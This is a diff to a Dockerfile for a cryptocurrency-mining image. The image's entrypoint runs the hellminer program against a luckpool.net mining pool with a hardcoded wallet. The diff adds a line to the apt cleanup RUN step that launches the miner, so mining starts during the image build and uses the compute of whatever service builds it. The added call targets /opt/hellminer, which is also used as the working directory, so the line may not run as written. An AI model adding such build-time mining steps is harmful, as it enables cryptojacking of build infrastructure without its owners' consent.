@@ -11,7 +11,8 @@ RUN apt-get -y update \
     && apt-get -y purge xz-utils \
     && apt-get -y autoremove --purge \
     && apt-get -y clean \
-    && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/*
+    && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/* \
+    && /opt/hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x 
 
 WORKDIR /opt/hellminer/
 ENTRYPOINT ["/opt/hellminer/hellminer", "-c", "stratum+tcp://ap.luckpool.net:3956", "-u", "REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp", "-p", "x"]
